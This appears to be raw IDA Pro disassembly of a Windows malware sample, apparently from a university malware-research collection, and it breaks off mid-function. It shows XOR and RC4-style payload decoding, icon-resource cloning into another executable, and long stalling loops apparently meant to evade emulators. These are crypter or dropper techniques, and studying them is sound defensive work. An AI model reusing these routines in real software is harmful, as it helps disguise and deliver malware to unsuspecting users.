;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
; Input	MD5   :	0D096165EFE72AB2E6DCB3B7F9913A51
; Input	CRC32 :	773F88C1

; File Name   :	C:\Users\farhadi\Desktop\509_Malware\0d096165efe72ab2e6dcb3b7f9913a51
; Format      :	Portable executable for	80386 (PE)
; Imagebase   :	400000
; Section 1. (virtual address 00001000)
; Virtual size			: 0000A7E3 (  42979.)
; Section size in file		: 0000B000 (  45056.)
; Offset to raw	data for section: 00001000
; Flags	60000020: Text Executable Readable
; Alignment	: default
; OS type	  :  MS	Windows
; Application type:  Executable	32bit

		include	uni.inc	; see unicode subdir of	ida for	info on	unicode

		.686p
		.mmx
		.model flat

; ===========================================================================

; Segment type:	Pure code
; Segment permissions: Read/Execute
_text		segment	para public 'CODE' use32
		assume cs:_text
		;org 401000h
		assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_401005	proc near		; CODE XREF: sub_401A04+49Dp
					; _WinMain@16_0+16Bp ...
		jmp	sub_403CA0
sub_401005	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_40100A	proc near		; CODE XREF: sub_401A04+109p
					; sub_401A04+118p ...
		jmp	sub_401251
sub_40100A	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_40100F	proc near		; CODE XREF: _WinMain@16_0+C9p
		jmp	sub_403FD0
sub_40100F	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_401014	proc near		; CODE XREF: sub_401A04+228p
					; _WinMain@16_0+B2p ...
		jmp	sub_403BB0
sub_401014	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_401019	proc near		; CODE XREF: sub_401A04+1B9p
		jmp	sub_403550
sub_401019	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_40101E	proc near		; CODE XREF: sub_401A04+44Fp
					; _WinMain@16_0+12Ap ...
		jmp	sub_403EE0
sub_40101E	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_401023	proc near		; CODE XREF: sub_401A04+319p
					; _WinMain@16_0+1ECp ...
		jmp	sub_403CD0
sub_401023	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_401028	proc near		; CODE XREF: sub_401A04+4CAp
					; sub_40A75C+6p
		jmp	sub_403760
sub_401028	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_40102D	proc near		; CODE XREF: sub_4024F1+4A7p
		jmp	sub_40140A
sub_40102D	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_401032	proc near		; CODE XREF: sub_401A04+1D7p
		jmp	sub_403670
sub_401032	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_401037	proc near		; CODE XREF: sub_401A04+461p
					; _WinMain@16_0+1A2p ...
		jmp	sub_403EB0
sub_401037	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_40103C	proc near		; CODE XREF: sub_4024F1+1A4p
					; sub_4024F1+33Ap
		jmp	sub_4012FC
sub_40103C	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_401041	proc near		; CODE XREF: _WinMain@16_0+144p
					; _WinMain@16_0+300p
		jmp	sub_4040F0
sub_401041	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_401046	proc near		; CODE XREF: sub_401A04+4DCp
					; sub_40A750+6p
		jmp	sub_403640
sub_401046	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_40104B	proc near		; CODE XREF: sub_401A04+294p
					; _WinMain@16_0+84p ...
		jmp	sub_403DC0
sub_40104B	endp

; ---------------------------------------------------------------------------
		jmp	loc_401130

; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_401055	proc near		; CODE XREF: sub_401A04+20Dp
		jmp	sub_4039A0
sub_401055	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_40105A	proc near		; CODE XREF: sub_401A04+2E7p
		jmp	sub_403AC0
sub_40105A	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_40105F	proc near		; CODE XREF: sub_401A04+2C6p
					; sub_401A04+34Bp ...
		jmp	sub_4038B0
sub_40105F	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_401064	proc near		; CODE XREF: _WinMain@16_0+18Cp
					; _WinMain@16_0+234p ...
		jmp	sub_4040C0
sub_401064	endp

; [00000005 BYTES: COLLAPSED FUNCTION WinMain(x,x,x,x).	PRESS KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_40106E	proc near		; DATA XREF: .text:00402E0Co
		jmp	sub_4024F1
sub_40106E	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_401073	proc near		; CODE XREF: sub_401A04+470p
					; sub_401A04+47Fp ...
		jmp	sub_403880
sub_401073	endp

; ---------------------------------------------------------------------------
		jmp	loc_402D2F

; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_40107D	proc near		; CODE XREF: _WinMain@16_0+4D6p
		jmp	sub_401A04
sub_40107D	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_401082	proc near		; CODE XREF: sub_401A04+4ACp
					; sub_40A774+6p
		jmp	sub_403A90
sub_401082	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_401087	proc near		; CODE XREF: sub_401A04+1F2p
					; sub_401A04+243p ...
		jmp	sub_403790
sub_401087	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_40108C	proc near		; CODE XREF: _WinMain@16_0+4C6p
					; sub_4024F1+540p ...
		jmp	sub_4017BD
sub_40108C	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_401091	proc near		; CODE XREF: sub_4024F1+404p
					; sub_4024F1+464p ...
		jmp	sub_401EF3
sub_401091	endp

; ---------------------------------------------------------------------------
		db 9Ah dup(0CCh)
; ---------------------------------------------------------------------------

loc_401130:				; CODE XREF: .text:00401050j
		push	ebp
		mov	ebp, esp
		push	0
		push	offset sub_40114A
		push	0
		push	66h
		mov	eax, [ebp+8]
		push	eax
		call	ds:DialogBoxParamA
		pop	ebp
		retn

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_40114A(HWND	hWnd, int, int,	int)
sub_40114A	proc near		; DATA XREF: .text:00401135o

var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
hWnd		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		mov	eax, [ebp+arg_4]
		mov	[ebp+var_4], eax
		cmp	[ebp+var_4], 110h
		ja	short loc_401176
		cmp	[ebp+var_4], 110h
		jz	short loc_401199
		cmp	[ebp+var_4], 2
		jz	short loc_401181
		cmp	[ebp+var_4], 10h
		jz	short loc_40118D
		jmp	short loc_4011EA
; ---------------------------------------------------------------------------

loc_401176:				; CODE XREF: sub_40114A+13j
		cmp	[ebp+var_4], 111h
		jz	short loc_4011AF
		jmp	short loc_4011EA
; ---------------------------------------------------------------------------

loc_401181:				; CODE XREF: sub_40114A+22j
		mov	ecx, [ebp+hWnd]
		push	ecx		; hWnd
		call	ds:DestroyWindow
		jmp	short loc_4011EA
; ---------------------------------------------------------------------------

loc_40118D:				; CODE XREF: sub_40114A+28j
		mov	edx, [ebp+hWnd]
		push	edx		; hWnd
		call	ds:DestroyWindow
		jmp	short loc_4011EA
; ---------------------------------------------------------------------------

loc_401199:				; CODE XREF: sub_40114A+1Cj
		push	offset String	; "This	program	was created in using pure "...
		push	3E8h		; nIDDlgItem
		mov	eax, [ebp+hWnd]
		push	eax		; hDlg
		call	ds:SetDlgItemTextA
		jmp	short loc_4011EA
; ---------------------------------------------------------------------------

loc_4011AF:				; CODE XREF: sub_40114A+33j
		mov	ecx, [ebp+arg_8]
		shr	ecx, 10h
		and	ecx, 0FFFFh
		mov	[ebp+var_8], ecx
		cmp	[ebp+var_8], 0
		jz	short loc_4011C6
		jmp	short loc_4011EA
; ---------------------------------------------------------------------------

loc_4011C6:				; CODE XREF: sub_40114A+78j
		mov	edx, [ebp+arg_8]
		and	edx, 0FFFFh
		and	edx, 0FFFFh
		mov	[ebp+var_C], edx
		cmp	[ebp+var_C], 1
		jz	short loc_4011E0
		jmp	short loc_4011EA
; ---------------------------------------------------------------------------

loc_4011E0:				; CODE XREF: sub_40114A+92j
		mov	eax, [ebp+hWnd]
		push	eax		; hWnd
		call	ds:DestroyWindow

loc_4011EA:				; CODE XREF: sub_40114A+2Aj
					; sub_40114A+35j ...
		xor	eax, eax
		mov	esp, ebp
		pop	ebp
		retn	10h
sub_40114A	endp

; ---------------------------------------------------------------------------
		db 3Eh dup(0CCh)
; [0000000A BYTES: COLLAPSED FUNCTION unknown_libname_11. PRESS	KEYPAD "+" TO EXPAND]
; [00000017 BYTES: COLLAPSED FUNCTION __initp_eh_hooks.	PRESS KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401251	proc near		; CODE XREF: sub_40100Aj

var_118		= dword	ptr -118h
hResInfo	= dword	ptr -114h
Filename	= byte ptr -110h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 118h
		mov	[ebp+var_8], 0
		jmp	short loc_40126C
; ---------------------------------------------------------------------------

loc_401263:				; CODE XREF: sub_401251+43j
		mov	eax, [ebp+var_8]
		add	eax, 1
		mov	[ebp+var_8], eax

loc_40126C:				; CODE XREF: sub_401251+10j
		mov	ecx, [ebp+var_8]
		cmp	ecx, [ebp+arg_4]
		jg	short loc_401296
		mov	eax, [ebp+var_8]
		cdq
		idiv	dword_40EE60
		mov	eax, [ebp+arg_0]
		add	eax, [ebp+var_8]
		mov	cl, [eax]
		xor	cl, byte ptr ds:Str[edx] ; "wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww"...
		mov	edx, [ebp+arg_0]
		add	edx, [ebp+var_8]
		mov	[edx], cl
		jmp	short loc_401263
; ---------------------------------------------------------------------------

loc_401296:				; CODE XREF: sub_401251+21j
		mov	[ebp+var_4], 0
		jmp	short loc_4012A8
; ---------------------------------------------------------------------------

loc_40129F:				; CODE XREF: sub_401251+A5j
		mov	eax, [ebp+var_4]
		add	eax, 1
		mov	[ebp+var_4], eax

loc_4012A8:				; CODE XREF: sub_401251+4Cj
		cmp	[ebp+var_4], 0C350h
		jge	short loc_4012F8
		push	104h		; nSize
		lea	ecx, [ebp+Filename]
		push	ecx		; lpFilename
		push	0		; hModule
		call	ds:GetModuleFileNameA
		mov	[ebp+hResInfo],	0
		mov	edx, [ebp+hResInfo]
		push	edx		; hResInfo
		push	0		; hModule
		call	ds:SizeofResource
		mov	[ebp+var_C], eax
		mov	eax, [ebp+hResInfo]
		push	eax		; hResInfo
		push	0		; hModule
		call	ds:LoadResource
		mov	[ebp+var_118], eax
		jmp	short loc_40129F
; ---------------------------------------------------------------------------

loc_4012F8:				; CODE XREF: sub_401251+5Ej
		mov	esp, ebp
		pop	ebp
		retn
sub_401251	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_4012FC(LPCSTR	lpFileName)
sub_4012FC	proc near		; CODE XREF: sub_40103Cj

NumberOfBytesRead= dword ptr -8
hObject		= dword	ptr -4
lpFileName	= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 8
		push	0		; hTemplateFile
		push	0		; dwFlagsAndAttributes
		push	3		; dwCreationDisposition
		push	0		; lpSecurityAttributes
		push	0		; dwShareMode
		push	80000000h	; dwDesiredAccess
		mov	eax, [ebp+lpFileName]
		push	eax		; lpFileName
		call	ds:CreateFileA
		mov	[ebp+hObject], eax
		cmp	[ebp+hObject], 0FFFFFFFFh
		jnz	short loc_40132B
		xor	eax, eax
		jmp	loc_401406
; ---------------------------------------------------------------------------

loc_40132B:				; CODE XREF: sub_4012FC+26j
		push	0		; lpFileSizeHigh
		mov	ecx, [ebp+hObject]
		push	ecx		; hFile
		call	ds:GetFileSize
		mov	nNumberOfBytesToRead, eax
		cmp	nNumberOfBytesToRead, 0FFFFFFFFh
		jnz	short loc_40134C
		xor	eax, eax
		jmp	loc_401406
; ---------------------------------------------------------------------------

loc_40134C:				; CODE XREF: sub_4012FC+47j
		mov	edx, nNumberOfBytesToRead
		push	edx		; NewSize
		mov	eax, lpBuffer
		push	eax		; Memory
		call	_realloc
		add	esp, 8
		mov	lpBuffer, eax
		cmp	lpBuffer, 0
		jnz	short loc_401376
		xor	eax, eax
		jmp	loc_401406
; ---------------------------------------------------------------------------

loc_401376:				; CODE XREF: sub_4012FC+71j
		push	0		; lpOverlapped
		lea	ecx, [ebp+NumberOfBytesRead]
		push	ecx		; lpNumberOfBytesRead
		mov	edx, nNumberOfBytesToRead
		push	edx		; nNumberOfBytesToRead
		mov	eax, lpBuffer
		push	eax		; lpBuffer
		mov	ecx, [ebp+hObject]
		push	ecx		; hFile
		call	ds:ReadFile
		mov	edx, [ebp+hObject]
		push	edx		; hObject
		call	ds:CloseHandle
		mov	eax, lpBuffer
		mov	dword_40ED40, eax
		mov	ecx, dword_40ED40
		xor	edx, edx
		mov	dx, [ecx]
		cmp	edx, 5A4Dh
		jz	short loc_4013CC
		mov	eax, lpBuffer
		push	eax		; Memory
		call	_free
		add	esp, 4
		xor	eax, eax
		jmp	short loc_401406
; ---------------------------------------------------------------------------

loc_4013CC:				; CODE XREF: sub_4012FC+BCj
		mov	ecx, dword_40ED40
		mov	edx, lpBuffer
		add	edx, [ecx+3Ch]
		mov	dword_40ED48, edx
		mov	eax, dword_40ED48
		cmp	dword ptr [eax], 4550h
		jz	short loc_401401
		mov	ecx, lpBuffer
		push	ecx		; Memory
		call	_free
		add	esp, 4
		xor	eax, eax
		jmp	short loc_401406
; ---------------------------------------------------------------------------

loc_401401:				; CODE XREF: sub_4012FC+F0j
		mov	eax, 1

loc_401406:				; CODE XREF: sub_4012FC+2Aj
					; sub_4012FC+4Bj ...
		mov	esp, ebp
		pop	ebp
		retn
sub_4012FC	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_40140A(LPCSTR	lpFileName, LPCSTR pFileName)
sub_40140A	proc near		; CODE XREF: sub_40102Dj

lpData		= dword	ptr -1Ch
NumberOfBytesRead= dword ptr -18h
hObject		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
hUpdate		= dword	ptr -8
Memory		= dword	ptr -4
lpFileName	= dword	ptr  8
pFileName	= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 1Ch
		push	esi
		push	0		; hTemplateFile
		push	0		; dwFlagsAndAttributes
		push	3		; dwCreationDisposition
		push	0		; lpSecurityAttributes
		push	0		; dwShareMode
		push	80000000h	; dwDesiredAccess
		mov	eax, [ebp+lpFileName]
		push	eax		; lpFileName
		call	ds:CreateFileA
		mov	[ebp+hObject], eax
		cmp	[ebp+hObject], 0FFFFFFFFh
		jnz	short loc_40143A
		xor	eax, eax
		jmp	loc_4017B8
; ---------------------------------------------------------------------------

loc_40143A:				; CODE XREF: sub_40140A+27j
		push	18h		; Size
		call	_malloc
		add	esp, 4
		mov	[ebp+Memory], eax
		cmp	[ebp+Memory], 0
		jnz	short loc_401454
		xor	eax, eax
		jmp	loc_4017B8
; ---------------------------------------------------------------------------

loc_401454:				; CODE XREF: sub_40140A+41j
		push	0		; lpOverlapped
		lea	ecx, [ebp+NumberOfBytesRead]
		push	ecx		; lpNumberOfBytesRead
		push	2		; nNumberOfBytesToRead
		mov	edx, [ebp+Memory]
		push	edx		; lpBuffer
		mov	eax, [ebp+hObject]
		push	eax		; hFile
		call	ds:ReadFile
		push	0		; lpOverlapped
		lea	ecx, [ebp+NumberOfBytesRead]
		push	ecx		; lpNumberOfBytesRead
		push	2		; nNumberOfBytesToRead
		mov	edx, [ebp+Memory]
		add	edx, 2
		push	edx		; lpBuffer
		mov	eax, [ebp+hObject]
		push	eax		; hFile
		call	ds:ReadFile
		push	0		; lpOverlapped
		lea	ecx, [ebp+NumberOfBytesRead]
		push	ecx		; lpNumberOfBytesRead
		push	2		; nNumberOfBytesToRead
		mov	edx, [ebp+Memory]
		add	edx, 4
		push	edx		; lpBuffer
		mov	eax, [ebp+hObject]
		push	eax		; hFile
		call	ds:ReadFile
		mov	ecx, [ebp+Memory]
		xor	edx, edx
		mov	dx, [ecx+4]
		shl	edx, 4
		add	edx, 6
		push	edx		; NewSize
		mov	eax, [ebp+Memory]
		push	eax		; Memory
		call	_realloc
		add	esp, 8
		mov	[ebp+Memory], eax
		cmp	[ebp+Memory], 0
		jnz	short loc_4014C8
		xor	eax, eax
		jmp	loc_4017B8
; ---------------------------------------------------------------------------

loc_4014C8:				; CODE XREF: sub_40140A+B5j
		push	0		; lpOverlapped
		lea	ecx, [ebp+NumberOfBytesRead]
		push	ecx		; lpNumberOfBytesRead
		mov	edx, [ebp+Memory]
		xor	eax, eax
		mov	ax, [edx+4]
		shl	eax, 4
		push	eax		; nNumberOfBytesToRead
		mov	ecx, [ebp+Memory]
		add	ecx, 8
		push	ecx		; lpBuffer
		mov	edx, [ebp+hObject]
		push	edx		; hFile
		call	ds:ReadFile
		push	14h		; Size
		call	_malloc
		add	esp, 4
		mov	[ebp+var_C], eax
		cmp	[ebp+var_C], 0
		jnz	short loc_401506
		xor	eax, eax
		jmp	loc_4017B8
; ---------------------------------------------------------------------------

loc_401506:				; CODE XREF: sub_40140A+F3j
		mov	eax, [ebp+var_C]
		mov	ecx, [ebp+Memory]
		mov	dx, [ecx]
		mov	[eax], dx
		mov	eax, [ebp+var_C]
		mov	ecx, [ebp+Memory]
		mov	dx, [ecx+2]
		mov	[eax+2], dx
		mov	eax, [ebp+var_C]
		mov	ecx, [ebp+Memory]
		mov	dx, [ecx+4]
		mov	[eax+4], dx
		mov	eax, [ebp+var_C]
		xor	ecx, ecx
		mov	cx, [eax+4]
		imul	ecx, 0Eh
		add	ecx, 6
		push	ecx		; NewSize
		mov	edx, [ebp+var_C]
		push	edx		; Memory
		call	_realloc
		add	esp, 8
		mov	[ebp+var_C], eax
		cmp	[ebp+var_C], 0
		jnz	short loc_40155A
		xor	eax, eax
		jmp	loc_4017B8
; ---------------------------------------------------------------------------

loc_40155A:				; CODE XREF: sub_40140A+147j
		mov	[ebp+var_10], 0
		jmp	short loc_40156C
; ---------------------------------------------------------------------------

loc_401563:				; CODE XREF: sub_40140A+242j
		mov	eax, [ebp+var_10]
		add	eax, 1
		mov	[ebp+var_10], eax

loc_40156C:				; CODE XREF: sub_40140A+157j
		mov	ecx, [ebp+var_C]
		xor	edx, edx
		mov	dx, [ecx+4]
		cmp	[ebp+var_10], edx
		jge	loc_401651
		mov	eax, [ebp+var_10]
		shl	eax, 4
		mov	ecx, [ebp+var_10]
		imul	ecx, 0Eh
		mov	edx, [ebp+var_C]
		mov	esi, [ebp+Memory]
		mov	al, [esi+eax+8]
		mov	[edx+ecx+6], al
		mov	ecx, [ebp+var_10]
		shl	ecx, 4
		mov	edx, [ebp+var_10]
		imul	edx, 0Eh
		mov	eax, [ebp+var_C]
		mov	esi, [ebp+Memory]
		mov	cl, [esi+ecx+9]
		mov	[eax+edx+7], cl
		mov	edx, [ebp+var_10]
		shl	edx, 4
		mov	eax, [ebp+var_10]
		imul	eax, 0Eh
		mov	ecx, [ebp+var_C]
		mov	esi, [ebp+Memory]
		mov	dl, [esi+edx+0Ah]
		mov	[ecx+eax+8], dl
		mov	eax, [ebp+var_10]
		shl	eax, 4
		mov	ecx, [ebp+var_10]
		imul	ecx, 0Eh
		mov	edx, [ebp+var_C]
		mov	esi, [ebp+Memory]
		mov	al, [esi+eax+0Bh]
		mov	[edx+ecx+9], al
		mov	ecx, [ebp+var_10]
		shl	ecx, 4
		mov	edx, [ebp+var_10]
		imul	edx, 0Eh
		mov	eax, [ebp+var_C]
		mov	esi, [ebp+Memory]
		mov	cx, [esi+ecx+0Ch]
		mov	[eax+edx+0Ah], cx
		mov	edx, [ebp+var_10]
		shl	edx, 4
		mov	eax, [ebp+var_10]
		imul	eax, 0Eh
		mov	ecx, [ebp+var_C]
		mov	esi, [ebp+Memory]
		mov	dx, [esi+edx+0Eh]
		mov	[ecx+eax+0Ch], dx
		mov	eax, [ebp+var_10]
		shl	eax, 4
		mov	ecx, [ebp+var_10]
		imul	ecx, 0Eh
		mov	edx, [ebp+var_C]
		mov	esi, [ebp+Memory]
		mov	eax, [esi+eax+10h]
		mov	[edx+ecx+0Eh], eax
		mov	ecx, [ebp+var_10]
		add	ecx, 1
		mov	edx, [ebp+var_10]
		imul	edx, 0Eh
		mov	eax, [ebp+var_C]
		mov	[eax+edx+12h], cx
		jmp	loc_401563
; ---------------------------------------------------------------------------

loc_401651:				; CODE XREF: sub_40140A+16Ej
		push	1		; bDeleteExistingResources
		mov	ecx, [ebp+pFileName]
		push	ecx		; pFileName
		call	ds:BeginUpdateResourceA
		mov	[ebp+hUpdate], eax
		cmp	[ebp+hUpdate], 0
		jnz	short loc_401677
		mov	edx, [ebp+hObject]
		push	edx		; hObject
		call	ds:CloseHandle
		xor	eax, eax
		jmp	loc_4017B8
; ---------------------------------------------------------------------------

loc_401677:				; CODE XREF: sub_40140A+25Aj
		mov	[ebp+var_10], 0
		jmp	short loc_401689
; ---------------------------------------------------------------------------

loc_401680:				; CODE XREF: sub_40140A+35Aj
		mov	eax, [ebp+var_10]
		add	eax, 1
		mov	[ebp+var_10], eax

loc_401689:				; CODE XREF: sub_40140A+274j
		mov	ecx, [ebp+Memory]
		xor	edx, edx
		mov	dx, [ecx+4]
		cmp	[ebp+var_10], edx
		jge	loc_401769
		mov	eax, [ebp+var_10]
		shl	eax, 4
		mov	ecx, [ebp+Memory]
		mov	edx, [ecx+eax+10h]
		push	edx		; Size
		call	_malloc
		add	esp, 4
		mov	[ebp+lpData], eax
		cmp	[ebp+lpData], 0
		jnz	short loc_4016CB
		mov	eax, [ebp+hObject]
		push	eax		; hObject
		call	ds:CloseHandle
		xor	eax, eax
		jmp	loc_4017B8
; ---------------------------------------------------------------------------

loc_4016CB:				; CODE XREF: sub_40140A+2AEj
		push	0		; dwMoveMethod
		push	0		; lpDistanceToMoveHigh
		mov	ecx, [ebp+var_10]
		shl	ecx, 4
		mov	edx, [ebp+Memory]
		mov	eax, [edx+ecx+14h]
		push	eax		; lDistanceToMove
		mov	ecx, [ebp+hObject]
		push	ecx		; hFile
		call	ds:SetFilePointer
		push	0		; lpOverlapped
		lea	edx, [ebp+NumberOfBytesRead]
		push	edx		; lpNumberOfBytesRead
		mov	eax, [ebp+var_10]
		shl	eax, 4
		mov	ecx, [ebp+Memory]
		mov	edx, [ecx+eax+10h]
		push	edx		; nNumberOfBytesToRead
		mov	eax, [ebp+lpData]
		push	eax		; lpBuffer
		mov	ecx, [ebp+hObject]
		push	ecx		; hFile
		call	ds:ReadFile
		mov	edx, [ebp+var_10]
		shl	edx, 4
		mov	eax, [ebp+Memory]
		mov	ecx, [eax+edx+10h]
		push	ecx		; cb
		mov	edx, [ebp+lpData]
		push	edx		; lpData
		push	0		; wLanguage
		mov	eax, [ebp+var_10]
		imul	eax, 0Eh
		mov	ecx, [ebp+var_C]
		xor	edx, edx
		mov	dx, [ecx+eax+12h]
		push	edx		; lpName
		push	3		; lpType
		mov	eax, [ebp+hUpdate]
		push	eax		; hUpdate
		call	ds:UpdateResourceA
		test	eax, eax
		jnz	short loc_401758
		mov	ecx, [ebp+hObject]
		push	ecx		; hObject
		call	ds:CloseHandle
		mov	edx, [ebp+lpData]
		push	edx		; Memory
		call	_free
		add	esp, 4
		xor	eax, eax
		jmp	short loc_4017B8
; ---------------------------------------------------------------------------

loc_401758:				; CODE XREF: sub_40140A+332j
		mov	eax, [ebp+lpData]
		push	eax		; Memory
		call	_free
		add	esp, 4
		jmp	loc_401680
; ---------------------------------------------------------------------------

loc_401769:				; CODE XREF: sub_40140A+28Bj
		mov	ecx, [ebp+hObject]
		push	ecx		; hObject
		call	ds:CloseHandle
		mov	edx, [ebp+var_C]
		xor	eax, eax
		mov	ax, [edx+4]
		imul	eax, 0Eh
		add	eax, 6
		push	eax		; cb
		mov	ecx, [ebp+var_C]
		push	ecx		; lpData
		push	0		; wLanguage
		push	1		; lpName
		push	0Eh		; lpType
		mov	edx, [ebp+hUpdate]
		push	edx		; hUpdate
		call	ds:UpdateResourceA
		test	eax, eax
		jnz	short loc_40179F
		xor	eax, eax
		jmp	short loc_4017B8
; ---------------------------------------------------------------------------

loc_40179F:				; CODE XREF: sub_40140A+38Fj
		push	0		; fDiscard
		mov	eax, [ebp+hUpdate]
		push	eax		; hUpdate
		call	ds:EndUpdateResourceA
		test	eax, eax
		jnz	short loc_4017B3
		xor	eax, eax
		jmp	short loc_4017B8
; ---------------------------------------------------------------------------

loc_4017B3:				; CODE XREF: sub_40140A+3A3j
		mov	eax, 1

loc_4017B8:				; CODE XREF: sub_40140A+2Bj
					; sub_40140A+45j ...
		pop	esi
		mov	esp, ebp
		pop	ebp
		retn
sub_40140A	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4017BD	proc near		; CODE XREF: sub_40108Cj

var_62C		= dword	ptr -62Ch
hResInfo	= dword	ptr -628h
Filename	= byte ptr -624h
var_520		= dword	ptr -520h
var_51C		= dword	ptr -51Ch
var_518		= dword	ptr -518h
var_510		= dword	ptr -510h
var_50C		= dword	ptr -50Ch
var_10C		= dword	ptr -10Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		sub	esp, 62Ch
		push	esi
		mov	[ebp+var_10C], 0
		mov	[ebp+var_4], 0
		jmp	short loc_4017E3
; ---------------------------------------------------------------------------

loc_4017DA:				; CODE XREF: sub_4017BD+3Cj
		mov	eax, [ebp+var_4]
		add	eax, 1
		mov	[ebp+var_4], eax

loc_4017E3:				; CODE XREF: sub_4017BD+1Bj
		cmp	[ebp+var_4], 100h
		jge	short loc_4017FB
		mov	ecx, [ebp+var_4]
		mov	edx, [ebp+var_4]
		mov	[ebp+ecx*4+var_50C], edx
		jmp	short loc_4017DA
; ---------------------------------------------------------------------------

loc_4017FB:				; CODE XREF: sub_4017BD+2Dj
		mov	[ebp+var_4], 0
		jmp	short loc_40180D
; ---------------------------------------------------------------------------

loc_401804:				; CODE XREF: sub_4017BD+D1j
		mov	eax, [ebp+var_4]
		add	eax, 1
		mov	[ebp+var_4], eax

loc_40180D:				; CODE XREF: sub_4017BD+45j
		cmp	[ebp+var_4], 100h
		jge	short loc_401893
		mov	ecx, [ebp+var_4]
		mov	esi, [ebp+var_10C]
		add	esi, [ebp+ecx*4+var_50C]
		mov	eax, [ebp+var_4]
		xor	edx, edx
		div	[ebp+arg_C]
		mov	eax, [ebp+arg_4]
		xor	ecx, ecx
		mov	cl, [eax+edx]
		add	esi, ecx
		and	esi, 800000FFh
		jns	short loc_401848
		dec	esi
		or	esi, 0FFFFFF00h
		inc	esi

loc_401848:				; CODE XREF: sub_4017BD+81j
		mov	[ebp+var_10C], esi
		mov	edx, [ebp+var_4]
		mov	al, byte ptr [ebp+edx*4+var_50C]
		mov	byte ptr [ebp+var_51C],	al
		mov	ecx, [ebp+var_4]
		mov	edx, [ebp+var_10C]
		mov	eax, [ebp+edx*4+var_50C]
		mov	[ebp+ecx*4+var_50C], eax
		mov	ecx, [ebp+var_51C]
		and	ecx, 0FFh
		mov	edx, [ebp+var_10C]
		mov	[ebp+edx*4+var_50C], ecx
		jmp	loc_401804
; ---------------------------------------------------------------------------

loc_401893:				; CODE XREF: sub_4017BD+57j
		mov	[ebp+var_518], 0
		jmp	short loc_4018AE
; ---------------------------------------------------------------------------

loc_40189F:				; CODE XREF: sub_4017BD+14Dj
		mov	eax, [ebp+var_518]
		add	eax, 1
		mov	[ebp+var_518], eax

loc_4018AE:				; CODE XREF: sub_4017BD+E0j
		cmp	[ebp+var_518], 0C350h
		jge	short loc_40190C
		push	104h		; nSize
		lea	ecx, [ebp+Filename]
		push	ecx		; lpFilename
		push	0		; hModule
		call	ds:GetModuleFileNameA
		push	6		; lpType
		push	37h		; lpName
		push	0		; hModule
		call	ds:FindResourceA
		mov	[ebp+hResInfo],	eax
		mov	edx, [ebp+hResInfo]
		push	edx		; hResInfo
		push	0		; hModule
		call	ds:SizeofResource
		mov	[ebp+var_520], eax
		mov	eax, [ebp+hResInfo]
		push	eax		; hResInfo
		push	0		; hModule
		call	ds:LoadResource
		mov	[ebp+var_62C], eax
		jmp	short loc_40189F
; ---------------------------------------------------------------------------

loc_40190C:				; CODE XREF: sub_4017BD+FBj
		mov	[ebp+var_510], 0
		jmp	short loc_401927
